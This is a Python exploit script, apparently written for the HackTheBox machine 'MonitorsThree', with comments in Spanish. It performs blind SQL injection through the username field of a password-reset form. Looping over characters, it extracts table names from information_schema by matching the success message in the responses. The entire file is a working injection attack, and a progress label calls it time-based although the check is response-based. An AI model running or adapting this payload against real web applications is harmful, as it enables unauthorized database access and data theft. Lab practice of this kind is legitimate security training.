#!/usr/bin/python3

from pwn import *
import requests, time, string, pdb, signal, re

def def_handler(sig, frame):
  print("\n\n[!] Saliendo...")
  sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url='http://monitorsthree.htb/forgot_password.php'

def makeRequest():
  p1 = log.progress("Blind SQLI")
  p1.status("Iniciando ataque de fuerza bruta basado basado en tiempo")

  p2 = log.progress("Databases")
  p3 = log.progress("Character")
  time.sleep(2)
  final_data = ""
  x = requests.get(main_url)
  cookie = x.cookies
  PHPSESSID = cookie.get('PHPSESSID')
  characters = string.ascii_lowercase + string.digits + string.punctuation
  puntoycoma="%3b"
  for position in range(0,6):
    for position_character in range(1,25):
      aux_data=final_data
      for character in characters:
        sqli=f"' or (select substr(table_name,{position_character},1) from information_schema.tables where table_schema='monitorsthree_db' limit {position},1)='{character}'-- -"
        cookies = {'PHPSESSID': PHPSESSID}
        data={'username': sqli}
        p3.status(character)
        r = requests.post(main_url, cookies=cookies, data=data)
        if "Successfully sent password reset request" in r.text:
          final_data += character
          p2.status(final_data)
          break
      if aux_data == final_data:
        break
    final_data+=","

if __name__ == '__main__':
  makeRequest()
